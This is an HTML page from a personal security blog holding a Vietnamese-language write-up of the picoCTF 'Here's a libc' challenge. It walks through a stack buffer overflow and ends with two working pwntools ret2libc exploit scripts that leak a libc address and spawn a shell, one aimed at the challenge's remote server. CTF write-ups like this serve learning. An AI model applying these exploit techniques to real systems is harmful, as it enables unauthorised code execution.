@@ -1,0 +1,562 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js dark">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Here&#x27;s a libc  - Hjn4 Blog</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../../theme/css/additional.css">
+
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('dark')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var html = document.querySelector('html');
+            var sidebar = null;
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - challenge 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - challenge 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - challenge 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - challenge 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - challenge 5</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item affix "><li class="part-title">Pico</li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pico/herelibc_challenge.html" class="active">Here's a libc </a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html">handy shellcode</a></li><li class="chapter-item affix "><li class="part-title">Docker</li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Hjn4 Blog</h1>
+
+                    <div class="right-buttons">
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="heres-a-libc"><a class="header" href="#heres-a-libc">Here's a libc</a></h1>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ls
+Makefile  libc.so.6  vuln
+hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ./vuln
+Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
+</code></pre>
+<p>Oke sau khi load file về, ta có 3 file như trên. Ta run binary thì không được. Là do binary này liên kết với file thư viện có version khác với version trên máy ta hiện tại.</p>
+<p>Để sure về điều đó thì mình cùng đi check thử xem:</p>
+<h3 id="binary-file"><a class="header" href="#binary-file">Binary file</a></h3>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ldd vuln
+        linux-vdso.so.1 (0x00007ffed6b25000)
+        libc.so.6 =&gt; ./libc.so.6 (0x00007f8825000000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f88253f5000)
+hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ strings libc.so.6| grep &quot;release version&quot;
+GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
+</code></pre>
+<p>file vuln link với libc version <em><strong>2.27</strong></em></p>
+<h3 id="my-machine"><a class="header" href="#my-machine">My machine</a></h3>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ strings /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;release version&quot;
+GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
+</code></pre>
+<p>Như đã thấy thì 2 version khá chênh nên ta cần đến <a href="https://github.com/io12/pwninit">pwninit</a></p>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ pwninit
+bin: ./vuln
+libc: ./libc.so.6
+
+fetching linker
+https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb
+unstripping libc
+https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb
+warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2)
+copying ./vuln to ./vuln_patched
+running patchelf on ./vuln_patched
+writing solve.py stub
+</code></pre>
+<p>Then,</p>
+<pre><code class="language-python">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ./vuln
+Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
+
+hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ls
+Makefile  ld-2.27.so  libc.so.6  solve.py  vuln  vuln_patched
+
+hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ./ld-2.27.so ./vuln
+WeLcOmE To mY EcHo sErVeR!
+abc
+AbC
+</code></pre>
+<p>Tuy nhiên như này thì trông nó khá là cồng kềnh, do đó:</p>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ patchelf --set-interpreter ./ld-2.27.so ./vuln
+
+hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc/test$ ./vuln
+WeLcOmE To mY EcHo sErVeR!
+abc
+AbC
+</code></pre>
+<p>Oke giờ thì bắt tay vào làm.</p>
+<h3 id="file"><a class="header" href="#file">File</a></h3>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ file vuln
+vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped
+</code></pre>
+<h3 id="checksec"><a class="header" href="#checksec">Checksec</a></h3>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ checksec vuln
+[*] '/mnt/d/pwn_myself/Pico/Here_libc/vuln'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'./'
+</code></pre>
+<h3 id="main-func"><a class="header" href="#main-func">Main func</a></h3>
+<pre><code class="language-c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  v7 = argc;
+  v6 = argv;
+  setbuf(_bss_start, 0LL);
+  rgid = getegid();
+  setresgid(rgid, rgid, rgid);
+  v11 = 27LL;
+  strcpy(v8, &quot;Welcome to my echo server!&quot;);
+  v10 = 26LL;
+  v3 = alloca(32LL);
+  s = (char *)&amp;v6;
+  for ( i = 0LL; i &lt; v11; ++i )
+  {
+    v4 = convert_case((unsigned int)v8[i], i);
+    s[i] = v4;
+  }
+  v5 = s;
+  puts(s);
+  while ( 1 )
+    do_stuff(v5);
+}
+</code></pre>
+<h3 id="convert_case-func"><a class="header" href="#convert_case-func">convert_case func</a></h3>
+<pre><code class="language-c">__int64 __fastcall convert_case(unsigned __int8 a1, char a2)
+{
+  __int64 result; // rax
+  if ( (char)a1 &lt;= 96 || (char)a1 &gt; 122 )
+  {
+    if ( (char)a1 &lt;= 64 || (char)a1 &gt; 90 )
+    {   result = a1;    }
+    else if ( (a2 &amp; 1) != 0 )
+    {   result = (unsigned int)a1 + 32; }
+    else
+    {  result = a1; }
+  }
+  else if ( (a2 &amp; 1) != 0 )
+  { result = a1;    }
+  else
+  { result = (unsigned int)a1 - 32; }
+  return result;
+}
+</code></pre>
+<h3 id="do_stuff-func"><a class="header" href="#do_stuff-func">do_stuff func</a></h3>
+<pre><code class="language-c">int do_stuff()
+{
+  char v0; // al
+  char v2; // [rsp+Fh] [rbp-81h] BYREF
+  char s[112]; // [rsp+10h] [rbp-80h] BYREF
+  __int64 v4; // [rsp+80h] [rbp-10h]
+  unsigned __int64 i; // [rsp+88h] [rbp-8h]
+
+  v4 = 0LL;
+  __isoc99_scanf(&quot;%[^\n]&quot;, s);
+  __isoc99_scanf(&quot;%c&quot;, &amp;v2);
+  for ( i = 0LL; i &lt;= 0x63; ++i )
+  {
+    v0 = convert_case(s[i], i);
+    s[i] = v0;
+  }
+  return puts(s);
+}
+</code></pre>
+<p>Lúc mới start chương trình thì gọi hàm convert_case với chuỗi đã chỉ định, và đây là output</p>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ ./vuln
+WeLcOmE To mY EcHo sErVeR!
+</code></pre>
+<p>Đọc sơ code thì có vẻ chức năng hàm convert_case cũng đơn giản chỉ là in hoa xen kẽ</p>
+<p>Sau khi xuất ra như thế thì flow chương trình vào vòng lặp với <strong>do_stuff</strong> </p>
+<p>Có 2 <em>scanf</em> đáng nói ở đây, <em><strong>&quot;%[^\n]&quot;</strong></em> chuỗi này cho phép mọi kí tự ngoại trừ <em>\n</em>, trong khi <em><strong>%c</strong></em> thì chỉ nhận 1 kí tự, có vẻ như sau khi nhập 1 chuỗi rồi nhấn enter thì <em>\n</em> là đầu vào của scanf thứ 2.</p>
+<p>Trong binary này không có công cụ cho việc lấy shell hay in flag, Nx lại enable ta sẽ suy nghĩ đến cái tên chall =&gt; ret2libc :))</p>
+<p>Oke giờ thì tính byte overflow đến return address nào.</p>
+<pre><code class="language-python">pwndbg&gt; disass do_stuff
+Dump of assembler code for function do_stuff:
+   0x00000000004006d8 &lt;+0&gt;:     push   rbp
+   0x00000000004006d9 &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004006dc &lt;+4&gt;:     sub    rsp,0x90
+   0x00000000004006e3 &lt;+11&gt;:    mov    QWORD PTR [rbp-0x10],0x0
+   0x00000000004006eb &lt;+19&gt;:    lea    rax,[rbp-0x80]
+   0x00000000004006ef &lt;+23&gt;:    mov    rsi,rax
+   0x00000000004006f2 &lt;+26&gt;:    lea    rdi,[rip+0x23b]        # 0x400934
+   0x00000000004006f9 &lt;+33&gt;:    mov    eax,0x0
+   0x00000000004006fe &lt;+38&gt;:    call   0x400580 &lt;__isoc99_scanf@plt&gt;
+   0x0000000000400703 &lt;+43&gt;:    lea    rax,[rbp-0x81]
+   0x000000000040070a &lt;+50&gt;:    mov    rsi,rax
+   0x000000000040070d &lt;+53&gt;:    lea    rdi,[rip+0x226]        # 0x40093a
+   0x0000000000400714 &lt;+60&gt;:    mov    eax,0x0
+   0x0000000000400719 &lt;+65&gt;:    call   0x400580 &lt;__isoc99_scanf@plt&gt;
+   0x000000000040071e &lt;+70&gt;:    mov    QWORD PTR [rbp-0x8],0x0
+   0x0000000000400726 &lt;+78&gt;:    jmp    0x40075b &lt;do_stuff+131&gt;
+   0x0000000000400728 &lt;+80&gt;:    lea    rdx,[rbp-0x80]
+   0x000000000040072c &lt;+84&gt;:    mov    rax,QWORD PTR [rbp-0x8]
+   0x0000000000400730 &lt;+88&gt;:    add    rax,rdx
+   0x0000000000400733 &lt;+91&gt;:    movzx  eax,BYTE PTR [rax]
+   0x0000000000400736 &lt;+94&gt;:    movsx  eax,al
+   0x0000000000400739 &lt;+97&gt;:    mov    rdx,QWORD PTR [rbp-0x8]
+   0x000000000040073d &lt;+101&gt;:   mov    rsi,rdx
+   0x0000000000400740 &lt;+104&gt;:   mov    edi,eax
+   0x0000000000400742 &lt;+106&gt;:   call   0x400677 &lt;convert_case&gt;
+   0x0000000000400747 &lt;+111&gt;:   mov    ecx,eax
+   0x0000000000400749 &lt;+113&gt;:   lea    rdx,[rbp-0x80]
+   0x000000000040074d &lt;+117&gt;:   mov    rax,QWORD PTR [rbp-0x8]
+   0x0000000000400751 &lt;+121&gt;:   add    rax,rdx
+   0x0000000000400754 &lt;+124&gt;:   mov    BYTE PTR [rax],cl
+   0x0000000000400756 &lt;+126&gt;:   add    QWORD PTR [rbp-0x8],0x1
+   0x000000000040075b &lt;+131&gt;:   cmp    QWORD PTR [rbp-0x8],0x63
+   0x0000000000400760 &lt;+136&gt;:   jbe    0x400728 &lt;do_stuff+80&gt;
+   0x0000000000400762 &lt;+138&gt;:   lea    rax,[rbp-0x80]
+   0x0000000000400766 &lt;+142&gt;:   mov    rdi,rax
+   0x0000000000400769 &lt;+145&gt;:   call   0x400540 &lt;puts@plt&gt;
+   0x000000000040076e &lt;+150&gt;:   nop
+   0x000000000040076f &lt;+151&gt;:   leave
+   0x0000000000400770 &lt;+152&gt;:   ret
+End of assembler dump.
+pwndbg&gt; b* 0x00000000004006fe
+Breakpoint 1 at 0x4006fe
+pwndbg&gt; b* 0x0000000000400770
+Breakpoint 2 at 0x400770
+
+</code></pre>
+<pre><code class="language-java"> ► 0x4006fe &lt;do_stuff+38&gt;    call   __isoc99_scanf@plt                      &lt;__isoc99_scanf@plt&gt;
+        format: 0x400934 ◂— 0x6325005d0a5e5b25 /* '%[^\n]' */
+        vararg: 0x7fffffffdfb0 —▸ 0x7fffffffe040 ◂— 'WeLcOmE To mY EcHo sErVeR!'
+
+</code></pre>
+<pre><code class="language-js">──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
+ ► 0x400770 &lt;do_stuff+152&gt;         ret                                  &lt;0x4008a0; main+303&gt;
+    ↓
+   0x4008a0 &lt;main+303&gt;             jmp    main+293                      &lt;main+293&gt;
+    ↓
+   0x400896 &lt;main+293&gt;             mov    eax, 0
+   0x40089b &lt;main+298&gt;             call   do_stuff                      &lt;do_stuff&gt;
+
+   0x4008a0 &lt;main+303&gt;             jmp    main+293                      &lt;main+293&gt;
+
+   0x4008a2                        nop    word ptr cs:[rax + rax]
+   0x4008ac                        nop    dword ptr [rax]
+   0x4008b0 &lt;__libc_csu_init&gt;      push   r15
+   0x4008b2 &lt;__libc_csu_init+2&gt;    push   r14
+   0x4008b4 &lt;__libc_csu_init+4&gt;    mov    r15, rdx
+   0x4008b7 &lt;__libc_csu_init+7&gt;    push   r13
+───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffe038 —▸ 0x4008a0 (main+303) ◂— jmp 0x400896
+01:0008│     0x7fffffffe040 ◂— 'WeLcOmE To mY EcHo sErVeR!'
+</code></pre>
+<pre><code class="language-python">&gt;&gt;&gt; str = 0x7fffffffdfb0
+&gt;&gt;&gt; ret = 0x7fffffffe038
+&gt;&gt;&gt; ret - str
+136
+</code></pre>
+<p>=&gt; overflow 136 bytes</p>
+<p>Cơ mà cần nơi để return về. Nói là ret2libc thì cần leak được địa chỉ trong binary để tính ra libc base.</p>
+<p>Do đó ta lợi dùng hàm <strong>puts</strong></p>
+<p>đưa vào đó puts_got để puts in ra địa chỉ thật trên binary <em>chỗ này mình cũng chưa hiểu tại sao :(( chắc như là 1+1=2</em></p>
+<p>Do đó ta cần gadget <strong>pop rdi ; ret</strong> và <strong>ret</strong></p>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ ROPgadget --binary vuln | grep &quot;pop rdi ; ret&quot;
+0x0000000000400913 : pop rdi ; ret
+------------------------------------------------
+0x000000000040052e : ret
+</code></pre>
+<p>Sau khi đã có được địa chỉ thực của puts =&gt; tìm các offset trên libc cần thiết:</p>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ readelf -sW /mnt/d/pwn_myself/Pico/Here_libc/libc.so.6 | grep &quot;puts&quot;
+   191: 0000000000080a30   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
+   422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+   496: 0000000000126870  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
+   678: 0000000000128780   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
+  1141: 000000000007f260   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
+  1677: 000000000007f260   396 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
+  2310: 000000000008a6b0   143 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5
+</code></pre>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ readelf -sW /mnt/d/pwn_myself/Pico/Here_libc/libc.so.6 | grep &quot;system&quot;
+   232: 000000000015a020    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
+   607: 000000000004f4e0    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+</code></pre>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/Here_libc$ strings -tx /mnt/d/pwn_myself/Pico/Here_libc/libc.so.6 | grep &quot;/b
+in/sh&quot;
+ 1b40fa /bin/sh
+</code></pre>
+<p>Đây chỉ mới là offset, do đó cần tính địa chỉ thực dựa vào libc base</p>
+<blockquote>
+<p>system_address = libc_base + system_offset</p>
+<p>binsh_address = libc_base + binsh_offset</p>
+</blockquote>
+<p>Sau khi gọi hàm puts thì cũng đừng quên ret về hàm khác <strong>(do_stuff)</strong> để tránh lỗi, chứ không puts xong thì nó biết làm gì nựa giờ.</p>
+<p>Sau khi có địa chỉ đầy đủ thì payload cuối cùng so ez</p>
+<h2 id="exploit-local-basic"><a class="header" href="#exploit-local-basic">Exploit local basic</a></h2>
+<pre><code class="language-python">from pwn import *
+
+binary  = context.binary = ELF('./vuln')
+r = process(binary.path)
+#gdb.attach(r, api=True)
+
+ret = 0x000000000040052e
+pop_rdi_ret = 0x0000000000400913
+do_stuff = 0x4006d8
+plt_puts = 0x400540
+got_puts = 0x601018
+
+junk = b&quot;a&quot; * 136
+payload = junk + p64(ret) + p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) 
+payload += p64(ret) + p64(do_stuff)
+
+r.sendline(payload)
+
+leak = r.recvline()
+leak = r.recvline()
+
+leak = u64(r.recvline().strip().ljust(8,b&quot;\x00&quot;))
+log.info('puts: ' + hex(leak))
+
+offset_puts = 0x0000000000080a30
+libc_base = leak - offset_puts
+print('libc base = ' + hex(libc_base))
+
+system_offset = 0x000000000004f4e0
+binsh_offset = 0x1b40fa
+
+system_address = libc_base + system_offset
+binsh_address = libc_base + binsh_offset
+
+payload = junk + p64(ret) + p64(pop_rdi_ret) + p64(binsh_address) +p64(system_address)
+r.sendline(payload)
+
+r.interactive()
+
+</code></pre>
+<h2 id="exploit-remote-and-local-vippro123"><a class="header" href="#exploit-remote-and-local-vippro123">Exploit remote and local vippro123</a></h2>
+<pre><code class="language-python">from pwn import *
+
+libc = ELF('libc.so.6')
+binary = ELF('./vuln')
+
+if not args.REMOTE:
+    r = process(binary.path)
+else:
+    r = remote('mercury.picoctf.net', 1774)
+
+rop = ROP(binary)
+pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+puts_offset = libc.symbols['puts']
+
+
+r.recvuntil(&quot;sErVeR!\n&quot;)
+
+payload1 = b'a' * 136
+payload1 += p64(ret)
+payload1 += p64(pop_rdi_ret)
+payload1 += p64(binary.got['puts'])
+payload1 += p64(binary.plt['puts'])
+payload1 += p64(ret)
+payload1 += p64(binary.symbols['do_stuff'])
+
+r.sendline(payload1)
+r.recvline()
+
+leak_puts = r.recv(6) + b'\x00\x00'
+print(&quot;Leaked puts: &quot; + str(hex(u64(leak_puts))))
+
+libc.address = u64(leak_puts) - puts_offset
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.symbols['system']
+
+
+payload2 = b'a'*136
+payload2 += p64(ret)
+payload2 += p64(pop_rdi_ret)
+payload2 += p64(bin_sh)
+payload2 += p64(system)
+
+r.sendline(payload2)
+r.interactive()
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next" href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next" href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
